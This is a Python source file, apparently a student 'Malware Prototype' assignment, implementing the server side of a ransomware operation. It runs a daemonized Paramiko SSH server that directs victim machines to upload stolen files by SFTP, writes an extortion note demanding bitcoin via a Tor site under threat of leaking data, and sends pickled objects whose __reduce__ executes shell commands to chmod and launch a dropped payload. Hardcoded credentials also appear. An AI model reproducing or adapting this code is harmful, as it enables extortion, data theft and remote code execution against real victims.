#!/usr/bin/python3

#==============================================================================
 #   Assignment:  Malware Protoype
 #
 #       Author:  Andy Garcia
 #     Language:  Python3 (paramiko, threading, sys, socket, io, signal, os, 
 #                         pickle, base64, codecs, logzero, argparse, atexit, 
 #                         datetime)                                
 #   To Compile:  n/a
 #
 #-----------------------------------------------------------------------------
 #
 #  Description:  Application that runs as malicious daemon in the background to
 #                execute ransomware attack.

 #        Input:  Start|Stop|Status
 #
 #       Output:  Logs errors and information regarding the victim's IP address
 #                source port for connecting to server. It also indicates the
 #                victim's personal ID and folder path for files stolen.
 #
 #    Algorithm:  Listens on 192.168.216.148 for SSH connections using Paramiko.
 #                Listens on 192.168.216.150 for SFTP connections using the 
 #                vanilla Open-SSH server daemon. Server will send different 
 #                replies depending on the client's connected (malicious daemon 
 #                or innocuous).
 #
 #   Required Features Not Included:  
 #
 #   Known Bugs:  n/a
 #
 #Classification: A
 #
#==============================================================================

import paramiko, threading, sys, socket, io, signal, os, pickle, base64, codecs
import logzero, argparse, atexit, datetime
from logzero import logger

#Displays help menu and switches that are supported with the program
def programSwitches():

    parser = argparse.ArgumentParser(description="Lottery Ticket Generator.")

    #Adds "-l" switch to choose the address to listen for incoming connections
    parser.add_argument("-l", help="Listen on socket address", type=str, 
                        dest="socketAddress", default="192.168.216.148", 
                        required=False)

    #Adds "-p" switch to choose socket port for listening
    parser.add_argument("-p", help="Listen on socket port", type=int, 
                        dest="socketPort", default=22, required=False)

    parser.add_argument("actionCommand", nargs='?', default="status")

    args = parser.parse_args()

    #Returns arguments passed
    return args


#Handles the clients requests and returns results to datacomm
def handleChild(clientSocket, userAddress, hostKey):

    #Initiates tunnel using Paramiko
    try:
        tunnelObject = paramiko.Transport(clientSocket)

        #Load file for group exchange key negotiation in server mode 
        try:
            tunnelObject.load_server_moduli()

        except Exception as e:
            logger.info(f"Failed to load moduli, error code {e}")
            raise

        #Adds SSH keys from 'id_rsa' file to tunnel object
        tunnelObject.add_server_key(hostKey)
        server = Server()

        #Starts tunnel using the server mode from the Paramiko server class
        try:
            tunnelObject.start_server(server=server)

        except paramiko.SSHException as e:
            logger.info('Error: SSH negotiation failed.')

        #Accepts 20 connections and logs each time a user is authenticated
        channelObject = tunnelObject.accept(20)
        logger.info(f'{userAddress} authenticated!')    

    except Exception as e:
        logger.info("Error code: {e}")

        try:
            tunnelObject.close()

        except:
            pass

        sys.exit(1)
        
    #Sends path variables to victim's machine for obfuscation
    remotePath = "/tmp/NotMalicious.py"
    localPath = "/home/algarcia1/DPI912_G6_malicious.py"
    ransomPath = "/home/algarcia1/Ransomware_README.txt"
    serverAddress = "192.168.216.150"
    login = "algarcia1"
    password = "Zxc123"
    paymentDate = datetime.datetime.now() + datetime.timedelta(hours=24)

    #Receives response from client to determine if its daemon or innocuous code
    victimID = pickle.loads(channelObject.recv(1024))

    #Execute commands for the malicious daemon running on the victims machine
    if victimID == "daemon":

        victimCounter = 0

        #Creates a directory to store files of the victim
        while True:
            
            if not os.path.isdir(f"/home/algarcia1/victims/{victimCounter}"):

                victimPath = f"/home/algarcia1/victims/{victimCounter}" 
                logger.info(f"Victim path created at {victimPath}")               
                break

            victimCounter += 1   

        logger.info(f"Malicious daemon connected using {userAddress}")
        
        #Response for victim with information to SFTP data back to server
        responseMessage = serverAddress, login, password, victimPath, ransomPath

        #Sends message to victim and confirms message was received correctly
        responseMessage = pickle.dumps(responseMessage)
        channelObject.send(responseMessage)
        isReceived(channelObject, responseMessage)
        logger.info(f"{userAddress} files will be saved to {victimPath}")
        channelObject.close()

    #Execute commands to retrieve the malicious daemon onto the victim's machine
    else:

        #Ransomware note using the UUID generated by the victim's machine
        ransomNote = f"""     
        You are officially a victim of Group 6's ransomware attack. All files 
        that you have access to on this system are encrypted and have been 
        transferred to our server. If you would like your data back, you must 
        pay 1 bitcoin for the decryption key before the payment deadline.  

        WARNING: Any attempt to contact authorities or the management team will
        result in the data being released to the dark web. The data from your
        system will also be PERMANENTLY removed. 

        Here are the steps:

        1. Set up a bitcoin wallet account 
        2. Download the tor-browser at https://www.torproject.org/download/
        3. After successful installation, run the browser
        4. Type in the address bar - http://group6gotyou.onion
        5. Submit payment on the site using your personal ID.

        Payment Deadline: {str(paymentDate)}
        Personal ID: {victimID}

        Here are some resources to help you set up an account:

        https://cryptonews.com/guides/3-ways-to-set-up-a-bitcoin-wallet.htm
        https://www.bitcoin.com/get-started/create-bitcoin-wallet/
        https://btcdirect.eu/en-gb/bitcoin-wallet
        """

        ransomPath = '/home/algarcia1/Ransomware_README.txt'

        #Writes new timestamps and personal IDs to ransomware file 
        with open(ransomPath, 'w') as ransomFile:
            ransomFile.write(ransomNote)

        logger.info(f"{userAddress} Personal ID: {victimID}")

        #Response to victim machine for information relating to SFTP
        responseMessage = victimID, remotePath, localPath, serverAddress 
        responseMessage += login, password
        
        #Class for creating object to execute malicious code
        class Malicious:

            def __reduce__(self):

                return (os.system, (f'/usr/bin/python3 {remotePath} start',))

        #Class for creating object to change permissions of malicious code
        class changePermission:

            def __reduce__(self):

                return (os.system, (f'chmod 6571 {remotePath}',))

        #Creates an object from the classes
        executePermission = changePermission()
        executeMalware = Malicious()
        
        #Encodes the objects using base64 encoding then pickles the objects
        permissionObject = base64.b64encode(pickle.dumps(executePermission))
        malwareObject = base64.b64encode(pickle.dumps(executeMalware))
        
        #Sends message and objects to victim's machine
        pickledResponse = pickle.dumps(responseMessage)

        #Sends response and checks if the client received message correctly
        channelObject.send(pickledResponse)
        isReceived(channelObject, pickledResponse)

        #Sends object and checks if the client received message correctly
        channelObject.send(permissionObject)
        isReceived(channelObject, permissionObject)

        #Sends object and checks if the client received message correctly
        channelObject.send(malwareObject)
        isReceived(channelObject, malwareObject)
        channelObject.close()


#Determines if the client has received the proper response
def isReceived(channelObject, clientData):

    resendCounter = 0

    #Attempts to resend the response, stop after 10 attempts
    while True:

        messageReceived = channelObject.recv(1024)

        #Checks if message received is the same as message sent
        if messageReceived == clientData:
            channelObject.send(b"True")
            break

        #Resends message and adds a counter if message was incorrect
        else:

            channelObject.send(clientData)
            resendCounter += 1

            #Terminates connections after 10 attempts
            if resendCounter >= 10:
                channelObject.send(b"Terminate")
                break


#Parent process closes client sockets after child process is executed
def handleParent(clientSocket):

    #Releases socket for child process
    clientSocket.close()


#Handles child processes and prevents zombie children
def signalHandler(signalNumber, signalFrame):

    #Waits for children process and does not block
    while True:

        try:
            processID, exitStatus = os.waitpid(-1, os.WNOHANG)
        
        except OSError:
             
            return

        if processID == 0:

            return


#Handles signal for terminating processes
def sigtermHandler(signalNumber, signalFrame):

    raise SystemExit(1)


#Handles start and stop signals for daemonizing application
def daemonizeApp(userArgs, *, stdin='/dev/null', stdout='/dev/null', 
                 stderr='/dev/null'):

    #Path of PID file
    daemonFile = "/var/run/daemon/DPI912_G6_server.pid"

    #Starts daemon process if daemon PID file doesn't exist
    if userArgs["actionCommand"] == "start":

        if os.path.exists(daemonFile):

            print("Daemon is already running.")
            raise SystemExit(0)

        #First fork to detach from parent. 
        try:
            
            #Closes parent for detaching child
            if os.fork() > 0:

                raise SystemExit(0)

        except OSError as e:

            raise RuntimeError("Failed to create fork #1.\n")

        #Changes directory and changes permissions to program and file system
        os.chdir('/')
        os.umask(0)
        os.setsid()
     
        #Creates second fork to detach from session leader and terminal
        try:

            #Closes parent for detaching child
            if os.fork() > 0:

                raise SystemExit(0)

        except OSError as e:

            raise RuntimeError("Failed to create fork #2.\n")

        #Flush I/O buffers
        sys.stdout.flush()
        sys.stderr.flush()

        #Replace file descriptors for stdin, stdout, and stderr
        with open(stdin, 'rb', 0) as fileOutput:

            os.dup2(fileOutput.fileno(), sys.stdin.fileno())

        with open(stdout, 'ab', 0) as fileOutput:

            os.dup2(fileOutput.fileno(), sys.stdout.fileno())

        with open(stderr, 'ab', 0) as fileOutput:

            os.dup2(fileOutput.fileno(), sys.stderr.fileno())

        #Checks if directory to hold daemon PID file exists
        if not os.path.exists('/var/run/daemon'):

            #Create directory for daemon PID file and change permissions
            try:

                os.setuid(0)
                os.setgid(0)
                os.mkdir('/var/run/daemon')
                os.system('sudo chown daemon:daemon /var/run/daemon')

                #Adds setuid and setgid bit to daemon directory
                os.chmod('/var/run/daemon', 0o6751)   

                #Adds sticky bit to daemon directory
                os.system('sudo chmod +t /var/run/daemon')

            except PermissionError:

               logger.info(f"Could not create directory/permissions for pid",
                        f"{os.getpid()}")

        try:
            #Write PID to file
            with open(daemonFile, "w") as fileOutput:

                print(os.getpid(), file=fileOutput)
        
        except Exception as e:

            logger.info(f"Could not create pid file, error {e}")

        #Setuid, Setgid, and Sticky bit for daemon PID file
        os.chmod(daemonFile, 0o6751)
        os.system(f'sudo chmod +t {daemonFile}')

        logger.info(f"Starting daemon with pid {os.getpid()}")

        #Removes daemon PID file if daemon is stopped
        atexit.register(lambda: os.remove(daemonFile))        

        #Signal handler for termination
        signal.signal(signal.SIGTERM, sigtermHandler)

        #Creates socket to listen for incoming connections
        createSocket(userArgs)

    #Closes daemon if daemon PID file exists
    elif userArgs["actionCommand"] == "stop":

        if os.path.exists(daemonFile):
    
            #Kills daemon with pid value stored in daemon pid file
            with open(daemonFile) as fileOutput:

                os.kill(int(fileOutput.read()), signal.SIGTERM)

            logger.info(f"Stopping daemon")

        else:

            print("Daemon not running", file=sys.stderr)
            raise SystemExit(1)

    #Checks if daemon PID file exists to determine if daemon is running
    elif userArgs["actionCommand"] == "status":

        if os.path.exists(daemonFile):

            print("Daemon is currently running.", file=sys.stderr)
        
        else:

            print("Daemon is not running.", file=sys.stderr)

    else:

        print(f"Usage: {sys.argv[0]} [start|stop|status]", file=sys.stderr)


#Creates socket to listen for incoming connections
def createSocket(userArgs):

    try:
        #Reads SSH key generated by 'sudo ssh-keygen -t rsa'
        with open('/home/algarcia1/.ssh/id_rsa', 'r') as certificateFile:

            certificateData = certificateFile.read()

        #Converts string from 'id_rsa' file to key file for paramiko
        keyFile = io.StringIO()
        keyFile.write(certificateData)
        keyFile.seek(0)

        #Supplied with paramiko
        hostKey = paramiko.RSAKey.from_private_key(keyFile)

    except Exception as errorMessage:

        logger.info(f"{errorMessage}")
        raise sys.exit(1)

    #Creates socket object
    try:
        socketAddress = (userArgs["socketAddress"], int(userArgs["socketPort"]))
        socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketObject.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        socketObject.bind(socketAddress)
        
    except Exception as e:

        logger.info(f"Could not bind socket, error Code: {e}")  
        sys.exit(1)

    try:
        #Listens for connections with a queue of 100
        socketObject.listen(0)
        logger.info(f'Listening for connections on {socketAddress}')

    except Exception as e:

        logger.info("Could not listen/bind/accept socket, error code:{e}")
        sys.exit(1)

    while True:
        
        #Accepts incoming connections and displays connection results
        clientSocket, clientAddress = socketObject.accept()
        logger.info(f"{clientAddress} connection established!")

        #Waits for parent to harvest child
        signal.signal(signal.SIGCHLD, signalHandler)

        #Creates a child process to handle client request
        try:
            processID = os.fork()
        
        except OSError as e:
            logger.info(f"Could not create child, error code: {e}")

        #Child process is executed and gracefully exited after completion
        if processID == 0:

            handleChild(clientSocket, clientAddress, hostKey)
            socketObject.close()
            os._exit(0)
            
        #Parent process to wait for child process to finish
        else:

            handleParent(clientSocket)


#Creates SSH Server
class Server (paramiko.ServerInterface):

    def _init_(self):

        self.event = threading.Event()

    #Checks type of connection request
    def check_channel_request(self, kind, chanid):

        if kind == 'session':
            
            return paramiko.OPEN_SUCCEEDED

        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    #Authenticates client establishing connection
    def check_auth_password(self, username, password):

        #Decodes credentials provided by client
        password = codecs.encode(str(password), "rot13")
        username = codecs.encode(str(username), "rot13")

        #Accepts credentials if correct
        if (username == 'algarcia1') and (password == 'Zxc123'):

            return paramiko.AUTH_SUCCESSFUL

        return paramiko.AUTH_FAILED


if __name__ == "__main__":

    #File path for daemon log file
    daemonLog = "/var/log/DPI912_G6_server.log"

    #Creates log file with maximum file size of 1MB and log rotation of 3
    logzero.logfile(daemonLog, maxBytes=1e6, backupCount=3, 
                    disableStderrLogger=True)

    #Setuid, Setgid, and Sticky bit for daemon log file
    os.system(f'sudo chown daemon:daemon {daemonLog}')
    os.chmod(daemonLog, 0o6751) 
    os.system(f'sudo chmod +t {daemonLog}')

    #Parses arguments and converts into dictionary
    userArgs = vars(programSwitches())

    #Daemonizes application
    daemonizeApp(userArgs)